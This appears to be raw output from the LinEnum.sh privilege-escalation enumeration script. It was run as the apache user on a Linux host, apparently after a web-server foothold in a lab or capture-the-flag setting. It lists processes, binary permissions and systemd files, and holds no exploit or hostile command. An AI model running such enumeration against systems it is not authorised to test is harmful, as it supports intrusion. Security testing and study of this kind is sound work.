root      4382  0.0  0.0      0     0 ?        S    05:55   0:00 [kworker/u2:1]
root      4385  0.0  0.0      0     0 ?        S    05:55   0:00 [kworker/0:1]
apache    4396  0.0  0.1  12208  1912 ?        S    05:56   0:00 /bin/bash ./LinEnum.sh
apache    4397  0.0  0.1  12212  1460 ?        R    05:56   0:00 /bin/bash ./LinEnum.sh
apache    4398  0.0  0.0   4360   348 ?        S    05:56   0:00 tee -a
root      4407  0.0  0.0 107948   348 ?        S    05:56   0:00 sleep 60
setroub+  4424 16.9  6.5 383776 66768 ?        Sl   05:56   0:02 /usr/bin/python -Es /usr/sbin/setroubleshootd -f
root      4743  0.0  0.0  47620   756 ?        S    05:57   0:00 /usr/lib/systemd/systemd-udevd
root      4744  0.0  0.0  47620   636 ?        S    05:57   0:00 /usr/lib/systemd/systemd-udevd
apache    4753  0.0  0.1  12212  1136 ?        S    05:57   0:00 /bin/bash ./LinEnum.sh
apache    4754  0.0  0.1  51708  1720 ?        R    05:57   0:00 ps aux
setroub+  4755  0.0  0.2  67780  2824 ?        R    05:57   0:00 rpm -q selinux-policy
apache    6930  0.0  0.8 413636  8340 ?        S    Mar23   0:00 /usr/sbin/httpd -DFOREGROUND
root      7166  0.0  0.3 107396  3836 ?        S    Mar23   0:00 /sbin/dhclient -d -q -sf /usr/libexec/nm-dhcp-helper -pf /var/run/dhclient-enp0s17.pid -lf /var/lib/NetworkManager/dhclient-74fe3bf0-8cf0-3920-ac97-3c027f325df4-enp0s17.lease -cf /var/lib/NetworkManager/dhclient-enp0s17.conf enp0s17


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x. 1 root root   964544 Apr 10  2018 /bin/bash
-rwxr-xr-x. 1 root root   223344 Apr 11  2018 /bin/dbus-daemon
lrwxrwxrwx. 1 root root        4 Jun 10  2018 /bin/sh -> bash
-rwxr-xr-x. 1 root root    40608 Apr 11  2018 /sbin/audispd
-rwxr-xr-x. 1 root root   124448 Apr 11  2018 /sbin/auditd
-rwxr-xr-x. 1 root root   424432 May 15  2018 /sbin/dhclient
-rwxr-xr-x. 1 root root    29752 Apr 10  2018 /sbin/rngd
-rwxr-xr-x. 1 root root    61504 Apr 11  2018 /sbin/rpcbind
lrwxrwxrwx. 1 root root        4 Jun 10  2018 /usr/bin/X -> Xorg
-rwxr-xr-x. 1 root root    15440 Apr 27  2018 /usr/bin/abrt-watch-log
-rwxr-xr-x. 1 root root   223344 Apr 11  2018 /usr/bin/dbus-daemon
-rwxr-xr-x. 1 root root    20624 Apr 12  2018 /usr/bin/gnome-shell
-rwxr-xr-x. 1 root root    24016 Apr 11  2018 /usr/bin/lsmd
-rwxr-xr-x. 1 root root    89840 Apr 12  2018 /usr/bin/pulseaudio
lrwxrwxrwx. 1 root root        7 Jun 10  2018 /usr/bin/python -> python2
-rwxr-xr-x. 1 root root   120424 Apr 10  2018 /usr/lib/polkit-1/polkitd
-rwxr-xr-x. 1 root root  1612152 Apr 11  2018 /usr/lib/systemd/systemd
-rwxr-xr-x. 1 root root   346216 Apr 11  2018 /usr/lib/systemd/systemd-journald
-rwxr-xr-x. 1 root root   635784 Apr 11  2018 /usr/lib/systemd/systemd-logind
-rwxr-xr-x. 1 root root   416304 Apr 11  2018 /usr/lib/systemd/systemd-udevd
-rwxr-xr-x. 1 root root   171176 Apr 11  2018 /usr/libexec/accounts-daemon
-rwxr-xr-x. 1 root root    24496 Aug  2  2017 /usr/libexec/at-spi-bus-launcher
-rwxr-xr-x. 1 root root    91400 Aug  2  2017 /usr/libexec/at-spi2-registryd
-rwxr-xr-x. 1 root root   337024 Aug  6  2017 /usr/libexec/colord
-rwxr-xr-x. 1 root root   298728 Apr 11  2018 /usr/libexec/gnome-session-binary
-rwxr-xr-x. 1 root root    29064 Apr 11  2018 /usr/libexec/gsd-a11y-keyboard
-rwxr-xr-x. 1 root root    16320 Apr 11  2018 /usr/libexec/gsd-a11y-settings
-rwxr-xr-x. 1 root root    29184 Apr 11  2018 /usr/libexec/gsd-clipboard
-rwxr-xr-x. 1 root root    81224 Apr 11  2018 /usr/libexec/gsd-color
-rwxr-xr-x. 1 root root    64416 Apr 11  2018 /usr/libexec/gsd-datetime
-rwxr-xr-x. 1 root root    46840 Apr 11  2018 /usr/libexec/gsd-housekeeping
-rwxr-xr-x. 1 root root    29320 Apr 11  2018 /usr/libexec/gsd-keyboard
-rwxr-xr-x. 1 root root   212552 Apr 11  2018 /usr/libexec/gsd-media-keys
-rwxr-xr-x. 1 root root    24776 Apr 11  2018 /usr/libexec/gsd-mouse
-rwxr-xr-x. 1 root root    89080 Apr 11  2018 /usr/libexec/gsd-power
-rwxr-xr-x. 1 root root    37760 Apr 11  2018 /usr/libexec/gsd-print-notifications
-rwxr-xr-x. 1 root root    42144 Apr 11  2018 /usr/libexec/gsd-rfkill
-rwxr-xr-x. 1 root root    24744 Apr 11  2018 /usr/libexec/gsd-screensaver-proxy
-rwxr-xr-x. 1 root root    29264 Apr 11  2018 /usr/libexec/gsd-sharing
-rwxr-xr-x. 1 root root   102360 Apr 11  2018 /usr/libexec/gsd-smartcard
-rwxr-xr-x. 1 root root    24856 Apr 11  2018 /usr/libexec/gsd-sound
-rwxr-xr-x. 1 root root    59576 Apr 11  2018 /usr/libexec/gsd-wacom
-rwxr-xr-x. 1 root root    60680 Apr 11  2018 /usr/libexec/gsd-xsettings
-rwxr-xr-x. 1 root root    20216 Apr 10  2018 /usr/libexec/ibus-dconf
-rwxr-xr-x. 1 root root    11752 Apr 10  2018 /usr/libexec/ibus-engine-simple
-rwxr-xr-x. 1 root root    80408 Apr 10  2018 /usr/libexec/ibus-portal
-rwxr-xr-x. 1 root root    95328 Apr 10  2018 /usr/libexec/ibus-x11
-rwxr-xr-x. 1 root root 14295280 Aug  4  2017 /usr/libexec/mysqld
-rwxr-xr-x. 1 root root   300584 May  9  2018 /usr/libexec/packagekitd
-rwxr-xr-x. 1 root root   172472 Jun  9  2014 /usr/libexec/postfix/master
-rwxr-xr-x. 1 root root    61072 Mar  6  2015 /usr/libexec/rtkit-daemon
-rwxr-xr-x. 1 root root   430792 Apr 12  2018 /usr/libexec/udisks2/udisksd
-rwxr-xr-x. 1 root root   236560 Aug  8  2017 /usr/libexec/upowerd
-rwxr-xr-x. 1 root root   493560 Apr 11  2018 /usr/libexec/xdg-permission-store
-rwxr-xr-x. 1 root root  1241656 Apr 10  2018 /usr/sbin/ModemManager
-rwxr-xr-x. 1 root root  2776280 May 16  2018 /usr/sbin/NetworkManager
-rwxr-xr-x. 1 root root    32056 Apr 27  2018 /usr/sbin/abrtd
-rwxr-xr-x. 1 root root    97208 Aug  3  2017 /usr/sbin/alsactl
-rwxr-xr-x. 1 root root    27792 Apr 10  2018 /usr/sbin/atd
-rwxr-xr-x. 1 root root   261024 Apr 12  2018 /usr/sbin/chronyd
-rwxr-xr-x. 1 root root    70128 Apr 10  2018 /usr/sbin/crond
-rwxr-xr-x. 1 root root   433304 Apr 11  2018 /usr/sbin/cupsd
-rwxr-xr-x. 1 root root   344896 Apr 10  2018 /usr/sbin/dnsmasq
-rwxr-xr-x. 1 root root   432384 Apr 12  2018 /usr/sbin/gdm
-rwxr-xr-x. 1 root root   133784 Apr 11  2018 /usr/sbin/gssproxy
-rwxr-xr-x. 1 root root   523688 Apr 20  2018 /usr/sbin/httpd
-rwxr-xr-x. 1 root root   620512 May 21  2018 /usr/sbin/libvirtd
-r-xr-xr-x. 1 root root    73456 Apr 11  2018 /usr/sbin/lvmetad
-rwxr-xr-x. 1 root root   251024 Apr 13  2018 /usr/sbin/nmbd
-rwxr-xr-x. 1 root root    36840 Apr 12  2018 /usr/sbin/rpc.idmapd
-rwxr-xr-x. 1 root root   132104 Apr 12  2018 /usr/sbin/rpc.mountd
-rwxr-xr-x. 1 root root   100032 Apr 12  2018 /usr/sbin/rpc.statd
-rwxr-xr-x. 1 root root   663960 May 16  2018 /usr/sbin/rsyslogd
-rwxr-xr-x. 1 root root    15920 Apr 11  2018 /usr/sbin/sedispatch
-rwxr-xr-x. 1 root root   653288 Apr 10  2018 /usr/sbin/smartd
-rwxr-xr-x. 1 root root    90024 Apr 13  2018 /usr/sbin/smbd
-rwxr-xr-x. 1 root root   853040 Apr 11  2018 /usr/sbin/sshd
-rwxr-xr-x. 1 root root  2027776 Apr 11  2018 /usr/sbin/wpa_supplicant


[-] /etc/init.d/ binary permissions:
lrwxrwxrwx. 1 root root 11 Jun 10  2018 /etc/init.d -> rc.d/init.d


[-] /etc/rc.d/init.d binary permissions:
total 44
drwxr-xr-x.  2 root root     83 Jun 23  2018 .
drwxr-xr-x. 10 root root    127 Jun 10  2018 ..
-rw-r--r--.  1 root root   1160 Apr 11  2018 README
-rw-r--r--.  1 root root  18104 Jan  2  2018 functions
-rwxr-xr-x.  1 root root   4334 Jan  2  2018 netconsole
-rwxr-xr-x.  1 root root   7293 Jan  2  2018 network
-r-xr-xr-x.  1 root ossec  1114 May 22  2014 ossec


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 7.8M
drwxr-xr-x. 26 root root  20K Jun 14  2018 system
drwxr-xr-x.  3 root root 4.0K Jun 13  2018 user
drwxr-xr-x.  2 root root 4.0K Jun 13  2018 system-generators
drwxr-xr-x.  2 root root   30 Jun 13  2018 scripts
drwxr-xr-x.  2 root root   49 Jun 13  2018 ntp-units.d
drwxr-xr-x.  2 root root  144 Jun 10  2018 system-preset
drwxr-xr-x.  2 root root   28 Jun 10  2018 system-shutdown
drwxr-xr-x.  2 root root  162 Jun 10  2018 catalog
lrwxrwxrwx.  1 root root   24 Jun 10  2018 systemd-sysv-install -> ../../..//sbin/chkconfig
-rwxr-xr-x.  1 root root 1.6M Apr 11  2018 systemd
-rwxr-xr-x.  1 root root  74K Apr 11  2018 systemd-backlight
-rwxr-xr-x.  1 root root  65K Apr 11  2018 systemd-binfmt
-rwxr-xr-x.  1 root root  36K Apr 11  2018 systemd-cgroups-agent
-rwxr-xr-x.  1 root root 134K Apr 11  2018 systemd-coredump
-rwxr-xr-x.  1 root root  41K Apr 11  2018 systemd-hibernate-resume
-rwxr-xr-x.  1 root root 364K Apr 11  2018 systemd-importd
-rwxr-xr-x.  1 root root 376K Apr 11  2018 systemd-localed
-rwxr-xr-x.  1 root root  45K Apr 11  2018 systemd-quotacheck
-rwxr-xr-x.  1 root root  45K Apr 11  2018 systemd-random-seed
-rwxr-xr-x.  1 root root  98K Apr 11  2018 systemd-readahead
-rwxr-xr-x.  1 root root  61K Apr 11  2018 systemd-remount-fs
-rwxr-xr-x.  1 root root  69K Apr 11  2018 systemd-sysctl
-rwxr-xr-x.  1 root root 377K Apr 11  2018 systemd-timedated
-rwxr-xr-x.  1 root root  45K Apr 11  2018 systemd-update-done
-rwxr-xr-x.  1 root root  45K Apr 11  2018 systemd-user-sessions
-rwxr-xr-x.  1 root root  53K Apr 11  2018 systemd-vconsole-setup
-rwxr-xr-x.  1 root root  24K Apr 11  2018 systemd-ac-power
-rwxr-xr-x.  1 root root  69K Apr 11  2018 systemd-activate
-rwxr-xr-x.  1 root root 130K Apr 11  2018 systemd-bootchart
-rwxr-xr-x.  1 root root 102K Apr 11  2018 systemd-cryptsetup
-rwxr-xr-x.  1 root root 332K Apr 11  2018 systemd-fsck
-rwxr-xr-x.  1 root root 368K Apr 11  2018 systemd-hostnamed
-rwxr-xr-x.  1 root root 310K Apr 11  2018 systemd-initctl
-rwxr-xr-x.  1 root root 339K Apr 11  2018 systemd-journald
-rwxr-xr-x.  1 root root 621K Apr 11  2018 systemd-logind
-rwxr-xr-x.  1 root root  53K Apr 11  2018 systemd-machine-id-commit
-rwxr-xr-x.  1 root root 483K Apr 11  2018 systemd-machined
-rwxr-xr-x.  1 root root  65K Apr 11  2018 systemd-modules-load
-rwxr-xr-x.  1 root root 184K Apr 11  2018 systemd-pull
-rwxr-xr-x.  1 root root  37K Apr 11  2018 systemd-reply-password
-rwxr-xr-x.  1 root root  61K Apr 11  2018 systemd-rfkill
-rwxr-xr-x.  1 root root 143K Apr 11  2018 systemd-shutdown
-rwxr-xr-x.  1 root root  65K Apr 11  2018 systemd-shutdownd
-rwxr-xr-x.  1 root root  90K Apr 11  2018 systemd-sleep
-rwxr-xr-x.  1 root root 106K Apr 11  2018 systemd-socket-proxyd
-rwxr-xr-x.  1 root root 407K Apr 11  2018 systemd-udevd
-rwxr-xr-x.  1 root root 310K Apr 11  2018 systemd-update-utmp
drwxr-xr-x.  2 root root    6 Apr 11  2018 user-preset
drwxr-xr-x.  2 root root    6 Apr 11  2018 system-sleep
drwxr-xr-x.  2 root root    6 Apr 11  2018 user-generators
-rw-r--r--.  1 root root 9.4K Apr 11  2018 import-pubring.gpg
-rwxr-xr-x.  1 root root 1.4K Jan  2  2018 rhel-autorelabel
-rwxr-xr-x.  1 root root  399 Jan  2  2018 rhel-configure
-rwxr-xr-x.  1 root root  110 Jan  2  2018 rhel-dmesg
-rwxr-xr-x.  1 root root  158 Jan  2  2018 rhel-domainname
-rwxr-xr-x.  1 root root 1.1K Jan  2  2018 rhel-import-state
-rwxr-xr-x.  1 root root  233 Jan  2  2018 rhel-loadmodules
-rwxr-xr-x.  1 root root 5.8K Jan  2  2018 rhel-readonly
-rwxr-xr-x.  1 root root  599 Nov  5  2016 rhel-dmraid-activation

/lib/systemd/system:
total 1.5M
lrwxrwxrwx. 1 root root   16 Jun 13  2018 rpcgssd.service -> rpc-gssd.service
lrwxrwxrwx. 1 root root   18 Jun 13  2018 rpcidmapd.service -> nfs-idmapd.service
lrwxrwxrwx. 1 root root   18 Jun 13  2018 nfs.service -> nfs-server.service
lrwxrwxrwx. 1 root root   17 Jun 13  2018 nfslock.service -> rpc-statd.service
lrwxrwxrwx. 1 root root   16 Jun 13  2018 nfs-secure.service -> rpc-gssd.service
lrwxrwxrwx. 1 root root   17 Jun 13  2018 nfs-lock.service -> rpc-statd.service
lrwxrwxrwx. 1 root root   18 Jun 13  2018 nfs-idmap.service -> nfs-idmapd.service
lrwxrwxrwx. 1 root root   19 Jun 13  2018 nfs-rquotad.service -> rpc-rquotad.service
drwxr-xr-x. 2 root root  121 Jun 13  2018 basic.target.wants
drwxr-xr-x. 2 root root   47 Jun 13  2018 system-update.target.wants
drwxr-xr-x. 2 root root 4.0K Jun 10  2018 sysinit.target.wants
drwxr-xr-x. 2 root root   83 Jun 10  2018 poweroff.target.wants
drwxr-xr-x. 2 root root   81 Jun 10  2018 reboot.target.wants
drwxr-xr-x. 2 root root  258 Jun 10  2018 multi-user.target.wants
drwxr-xr-x. 2 root root   35 Jun 10  2018 halt.target.wants
drwxr-xr-x. 2 root root   72 Jun 10  2018 initrd-switch-root.target.wants
drwxr-xr-x. 2 root root   36 Jun 10  2018 kexec.target.wants
drwxr-xr-x. 2 root root  189 Jun 10  2018 sockets.target.wants
lrwxrwxrwx. 1 root root   12 Jun 10  2018 messagebus.service -> dbus.service
drwxr-xr-x. 2 root root   42 Jun 10  2018 timers.target.wants
drwxr-xr-x. 2 root root   50 Jun 10  2018 runlevel1.target.wants
lrwxrwxrwx. 1 root root   17 Jun 10  2018 runlevel2.target -> multi-user.target
drwxr-xr-x. 2 root root   50 Jun 10  2018 runlevel2.target.wants
lrwxrwxrwx. 1 root root   17 Jun 10  2018 runlevel3.target -> multi-user.target
drwxr-xr-x. 2 root root   50 Jun 10  2018 runlevel3.target.wants
lrwxrwxrwx. 1 root root   17 Jun 10  2018 runlevel4.target -> multi-user.target
drwxr-xr-x. 2 root root   50 Jun 10  2018 runlevel4.target.wants
lrwxrwxrwx. 1 root root   16 Jun 10  2018 runlevel5.target -> graphical.target
drwxr-xr-x. 2 root root   50 Jun 10  2018 runlevel5.target.wants
lrwxrwxrwx. 1 root root   13 Jun 10  2018 runlevel6.target -> reboot.target
lrwxrwxrwx. 1 root root   15 Jun 10  2018 runlevel0.target -> poweroff.target
lrwxrwxrwx. 1 root root   13 Jun 10  2018 runlevel1.target -> rescue.target
drwxr-xr-x. 2 root root   50 Jun 10  2018 rescue.target.wants
drwxr-xr-x. 2 root root   40 Jun 10  2018 local-fs.target.wants
drwxr-xr-x. 2 root root   50 Jun 10  2018 graphical.target.wants
lrwxrwxrwx. 1 root root   16 Jun 10  2018 default.target -> graphical.target
lrwxrwxrwx. 1 root root   13 Jun 10  2018 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx. 1 root root   25 Jun 10  2018 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx. 1 root root   23 Jun 10  2018 dbus-org.freedesktop.import1.service -> systemd-importd.service
lrwxrwxrwx. 1 root root   23 Jun 10  2018 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx. 1 root root   22 Jun 10  2018 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx. 1 root root   24 Jun 10  2018 dbus-org.freedesktop.machine1.service -> systemd-machined.service
lrwxrwxrwx. 1 root root   25 Jun 10  2018 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
lrwxrwxrwx. 1 root root   14 Jun 10  2018 autovt@.service -> getty@.service
drwxr-xr-x. 2 root root  225 Jun 10  2018 initrd.target.wants
drwxr-xr-x. 2 root root   37 Jun 10  2018 shutdown.target.wants
lrwxrwxrwx. 1 root root   59 Jun 10  2018 dracut-pre-trigger.service -> ../../dracut/modules.d/98systemd/dracut-pre-trigger.service
lrwxrwxrwx. 1 root root   56 Jun 10  2018 dracut-pre-udev.service -> ../../dracut/modules.d/98systemd/dracut-pre-udev.service
lrwxrwxrwx. 1 root root   56 Jun 10  2018 dracut-shutdown.service -> ../../dracut/modules.d/98systemd/dracut-shutdown.service
lrwxrwxrwx. 1 root root   55 Jun 10  2018 dracut-cmdline.service -> ../../dracut/modules.d/98systemd/dracut-cmdline.service
lrwxrwxrwx. 1 root root   57 Jun 10  2018 dracut-initqueue.service -> ../../dracut/modules.d/98systemd/dracut-initqueue.service
lrwxrwxrwx. 1 root root   53 Jun 10  2018 dracut-mount.service -> ../../dracut/modules.d/98systemd/dracut-mount.service
lrwxrwxrwx. 1 root root   57 Jun 10  2018 dracut-pre-mount.service -> ../../dracut/modules.d/98systemd/dracut-pre-mount.service
lrwxrwxrwx. 1 root root   57 Jun 10  2018 dracut-pre-pivot.service -> ../../dracut/modules.d/98systemd/dracut-pre-pivot.service
-rw-r--r--. 1 root root  403 May 24  2018 microcode.service
-rw-r--r--. 1 root root 1.4K May 21  2018 libvirtd.service
-rw-r--r--. 1 root root   77 May 21  2018 virt-guest-shutdown.target
-rw-r--r--. 1 root root  663 May 21  2018 virtlockd.service
-rw-r--r--. 1 root root  169 May 21  2018 virtlockd.socket
-rw-r--r--. 1 root root  797 May 21  2018 virtlogd.service
-rw-r--r--. 1 root root  167 May 21  2018 virtlogd.socket
-rw-r--r--. 1 root root  294 May 21  2018 cpupower.service
-rw-r--r--. 1 root root  270 May 21  2018 ksm.service
-rw-r--r--. 1 root root  229 May 21  2018 ksmtuned.service
-rw-r--r--. 1 root root  278 May 16  2018 vdo.service
-rw-r--r--. 1 root root  465 May 16  2018 rsyslog.service
-rw-r--r--. 1 root root  370 May 16  2018 rdma.service
-rw-r--r--. 1 root root  583 May 16  2018 rdma-hw.target
-rw-r--r--. 1 root root  884 May 16  2018 rdma-load-modules@.service
-rw-r--r--. 1 root root  843 May 16  2018 rdma-ndd.service
-rw-r--r--. 1 root root  244 May 16  2018 radvd.service
-rw-r--r--. 1 root root  331 May 16  2018 target.service
-rw-r--r--. 1 root root  353 May 16  2018 NetworkManager-dispatcher.service
-rw-r--r--. 1 root root  303 May 16  2018 NetworkManager-wait-online.service
-rw-r--r--. 1 root root 1.1K May 16  2018 NetworkManager.service
-rw-r--r--. 1 root root  349 May 16  2018 certmonger.service
-rw-r--r--. 1 root root  160 May  9  2018 packagekit-offline-update.service
-rw-r--r--. 1 root root  138 May  9  2018 packagekit.service
-rw-r--r--. 1 root root  682 May  3  2018 anaconda-direct.service
-rw-r--r--. 1 root root  185 May  3  2018 anaconda-nm-config.service
-rw-r--r--. 1 root root  660 May  3  2018 anaconda-noshell.service
-rw-r--r--. 1 root root  585 May  3  2018 anaconda-pre.service
-rw-r--r--. 1 root root  532 May  3  2018 anaconda-shell@.service
-rw-r--r--. 1 root root  574 May  3  2018 anaconda-sshd.service
-rw-r--r--. 1 root root  498 May  3  2018 anaconda-tmux@.service
-rw-r--r--. 1 root root  442 May  3  2018 anaconda.service
-rw-r--r--. 1 root root  415 May  3  2018 anaconda.target
-rw-r--r--. 1 root root  163 May  3  2018 instperf.service
-rw-r--r--. 1 root root  275 May  3  2018 zram.service
-rw-r--r--. 1 root root  275 Apr 27  2018 abrt-ccpp.service
-rw-r--r--. 1 root root  361 Apr 27  2018 abrt-oops.service
-rw-r--r--. 1 root root  266 Apr 27  2018 abrt-pstoreoops.service
-rw-r--r--. 1 root root  262 Apr 27  2018 abrt-vmcore.service
-rw-r--r--. 1 root root  311 Apr 27  2018 abrt-xorg.service
-rw-r--r--. 1 root root  380 Apr 27  2018 abrtd.service
-rw-r--r--. 1 root root  389 Apr 13  2018 nmb.service
-rw-r--r--. 1 root root  435 Apr 13  2018 smb.service
-rw-r--r--. 1 root root  381 Apr 13  2018 plymouth-halt.service
-rw-r--r--. 1 root root  396 Apr 13  2018 plymouth-kexec.service
-rw-r--r--. 1 root root  393 Apr 13  2018 plymouth-poweroff.service
-rw-r--r--. 1 root root  243 Apr 13  2018 plymouth-quit-wait.service
-rw-r--r--. 1 root root  235 Apr 13  2018 plymouth-quit.service
-rw-r--r--. 1 root root  282 Apr 13  2018 plymouth-read-write.service
-rw-r--r--. 1 root root  386 Apr 13  2018 plymouth-reboot.service
-rw-r--r--. 1 root root  546 Apr 13  2018 plymouth-start.service
-rw-r--r--. 1 root root  295 Apr 13  2018 plymouth-switch-root.service
-rw-r--r--. 1 root root  419 Apr 13  2018 systemd-ask-password-plymouth.path
-rw-r--r--. 1 root root  400 Apr 13  2018 systemd-ask-password-plymouth.service
-rw-r--r--. 1 root root  646 Apr 12  2018 auth-rpcgss-module.service
-rw-r--r--. 1 root root  350 Apr 12  2018 nfs-blkmap.service
-rw-r--r--. 1 root root  413 Apr 12  2018 nfs-client.target
-rw-r--r--. 1 root root  375 Apr 12  2018 nfs-config.service
-rw-r--r--. 1 root root  330 Apr 12  2018 nfs-idmapd.service
-rw-r--r--. 1 root root  395 Apr 12  2018 nfs-mountd.service
-rw-r--r--. 1 root root 1010 Apr 12  2018 nfs-server.service
-rw-r--r--. 1 root root  567 Apr 12  2018 nfs-utils.service
-rw-r--r--. 1 root root   98 Apr 12  2018 proc-fs-nfsd.mount
-rw-r--r--. 1 root root  402 Apr 12  2018 rpc-gssd.service
-rw-r--r--. 1 root root  558 Apr 12  2018 rpc-statd-notify.service
-rw-r--r--. 1 root root  486 Apr 12  2018 rpc-statd.service
-rw-r--r--. 1 root root   80 Apr 12  2018 rpc_pipefs.target
-rw-r--r--. 1 root root  191 Apr 12  2018 var-lib-nfs-rpc_pipefs.mount
-rw-r--r--. 1 root root  472 Apr 12  2018 sssd-autofs.service
-rw-r--r--. 1 root root  371 Apr 12  2018 sssd-autofs.socket
-rw-r--r--. 1 root root  351 Apr 12  2018 sssd-nss.service
-rw-r--r--. 1 root root  420 Apr 12  2018 sssd-nss.socket
-rw-r--r--. 1 root root  460 Apr 12  2018 sssd-pac.service
-rw-r--r--. 1 root root  362 Apr 12  2018 sssd-pac.socket
-rw-r--r--. 1 root root  443 Apr 12  2018 sssd-pam-priv.socket
-rw-r--r--. 1 root root  481 Apr 12  2018 sssd-pam.service
-rw-r--r--. 1 root root  391 Apr 12  2018 sssd-pam.socket
-rw-r--r--. 1 root root  244 Apr 12  2018 sssd-secrets.service
-rw-r--r--. 1 root root  173 Apr 12  2018 sssd-secrets.socket
-rw-r--r--. 1 root root  460 Apr 12  2018 sssd-ssh.service
-rw-r--r--. 1 root root  362 Apr 12  2018 sssd-ssh.socket
-rw-r--r--. 1 root root  465 Apr 12  2018 sssd-sudo.service
-rw-r--r--. 1 root root  365 Apr 12  2018 sssd-sudo.socket
-rw-r--r--. 1 root root  420 Apr 12  2018 sssd.service
-rw-r--r--. 1 root root 1012 Apr 12  2018 gdm.service
-rw-r--r--. 1 root root 1.3K Apr 12  2018 ipsec.service
-rw-r--r--. 1 root root  169 Apr 12  2018 clean-mount-point@.service
-rw-r--r--. 1 root root  207 Apr 12  2018 udisks2.service
-rw-r--r--. 1 root root  464 Apr 12  2018 autofs.service
-rw-r--r--. 1 root root  313 Apr 12  2018 kdump.service
-rw-r--r--. 1 root root  488 Apr 12  2018 chronyd.service
drwxr-xr-x. 2 root root    6 Apr 11  2018 dbus.target.wants
drwxr-xr-x. 2 root root    6 Apr 11  2018 default.target.wants
drwxr-xr-x. 2 root root    6 Apr 11  2018 syslog.target.wants
-rw-r--r--. 1 root root  403 Apr 11  2018 -.slice
-rw-r--r--. 1 root root  517 Apr 11  2018 basic.target
-rw-r--r--. 1 root root  379 Apr 11  2018 bluetooth.target
-rw-r--r--. 1 root root  787 Apr 11  2018 console-getty.service
-rw-r--r--. 1 root root  749 Apr 11  2018 console-shell.service
-rw-r--r--. 1 root root  808 Apr 11  2018 container-getty@.service
-rw-r--r--. 1 root root  425 Apr 11  2018 cryptsetup-pre.target
-rw-r--r--. 1 root root  372 Apr 11  2018 cryptsetup.target
-rw-r--r--. 1 root root 1014 Apr 11  2018 debug-shell.service
-rw-r--r--. 1 root root  670 Apr 11  2018 dev-hugepages.mount
-rw-r--r--. 1 root root  590 Apr 11  2018 dev-mqueue.mount
-rw-r--r--. 1 root root  976 Apr 11  2018 emergency.service
-rw-r--r--. 1 root root  431 Apr 11  2018 emergency.target
-rw-r--r--. 1 root root  440 Apr 11  2018 final.target
-rw-r--r--. 1 root root  466 Apr 11  2018 getty-pre.target
-rw-r--r--. 1 root root  460 Apr 11  2018 getty.target
-rw-r--r--. 1 root root 1.6K Apr 11  2018 getty@.service
-rw-r--r--. 1 root root  558 Apr 11  2018 graphical.target
-rw-r--r--. 1 root root  565 Apr 11  2018 halt-local.service
-rw-r--r--. 1 root root  487 Apr 11  2018 halt.target
-rw-r--r--. 1 root root  447 Apr 11  2018 hibernate.target
-rw-r--r--. 1 root root  468 Apr 11  2018 hybrid-sleep.target
-rw-r--r--. 1 root root  634 Apr 11  2018 initrd-cleanup.service
-rw-r--r--. 1 root root  553 Apr 11  2018 initrd-fs.target
-rw-r--r--. 1 root root  802 Apr 11  2018 initrd-parse-etc.service
-rw-r--r--. 1 root root  526 Apr 11  2018 initrd-root-fs.target
-rw-r--r--. 1 root root  644 Apr 11  2018 initrd-switch-root.service
-rw-r--r--. 1 root root  691 Apr 11  2018 initrd-switch-root.target
-rw-r--r--. 1 root root  668 Apr 11  2018 initrd-udevadm-cleanup-db.service
-rw-r--r--. 1 root root  671 Apr 11  2018 initrd.target
-rw-r--r--. 1 root root  501 Apr 11  2018 kexec.target
-rw-r--r--. 1 root root  679 Apr 11  2018 kmod-static-nodes.service
-rw-r--r--. 1 root root  395 Apr 11  2018 local-fs-pre.target
-rw-r--r--. 1 root root  507 Apr 11  2018 local-fs.target
-rw-r--r--. 1 root root  405 Apr 11  2018 machine.slice
-rw-r--r--. 1 root root  531 Apr 11  2018 machines.target
-rw-r--r--. 1 root root  492 Apr 11  2018 multi-user.target
-rw-r--r--. 1 root root  464 Apr 11  2018 network-online.target
-rw-r--r--. 1 root root  461 Apr 11  2018 network-pre.target
-rw-r--r--. 1 root root  480 Apr 11  2018 network.target
-rw-r--r--. 1 root root  514 Apr 11  2018 nss-lookup.target
-rw-r--r--. 1 root root  473 Apr 11  2018 nss-user-lookup.target
-rw-r--r--. 1 root root  354 Apr 11  2018 paths.target
-rw-r--r--. 1 root root  552 Apr 11  2018 poweroff.target
-rw-r--r--. 1 root root  377 Apr 11  2018 printer.target
-rw-r--r--. 1 root root  693 Apr 11  2018 proc-sys-fs-binfmt_misc.automount
-rw-r--r--. 1 root root  603 Apr 11  2018 proc-sys-fs-binfmt_misc.mount
-rw-r--r--. 1 root root  643 Apr 11  2018 quotaon.service
-rw-r--r--. 1 root root  632 Apr 11  2018 rc-local.service
-rw-r--r--. 1 root root  543 Apr 11  2018 reboot.target
-rw-r--r--. 1 root root  509 Apr 11  2018 remote-cryptsetup.target
-rw-r--r--. 1 root root  396 Apr 11  2018 remote-fs-pre.target
-rw-r--r--. 1 root root  482 Apr 11  2018 remote-fs.target
-rw-r--r--. 1 root root  979 Apr 11  2018 rescue.service
-rw-r--r--. 1 root root  486 Apr 11  2018 rescue.target
-rw-r--r--. 1 root root  500 Apr 11  2018 rpcbind.target
-rw-r--r--. 1 root root 1.1K Apr 11  2018 serial-getty@.service
-rw-r--r--. 1 root root  402 Apr 11  2018 shutdown.target
-rw-r--r--. 1 root root  362 Apr 11  2018 sigpwr.target
-rw-r--r--. 1 root root  420 Apr 11  2018 sleep.target
-rw-r--r--. 1 root root  409 Apr 11  2018 slices.target
-rw-r--r--. 1 root root  380 Apr 11  2018 smartcard.target
-rw-r--r--. 1 root root  356 Apr 11  2018 sockets.target
-rw-r--r--. 1 root root  380 Apr 11  2018 sound.target
-rw-r--r--. 1 root root  441 Apr 11  2018 suspend.target
-rw-r--r--. 1 root root  353 Apr 11  2018 swap.target
-rw-r--r--. 1 root root  681 Apr 11  2018 sys-fs-fuse-connections.mount
-rw-r--r--. 1 root root  719 Apr 11  2018 sys-kernel-config.mount
-rw-r--r--. 1 root root  662 Apr 11  2018 sys-kernel-debug.mount
-rw-r--r--. 1 root root  518 Apr 11  2018 sysinit.target
-rw-r--r--. 1 root root 1.3K Apr 11  2018 syslog.socket
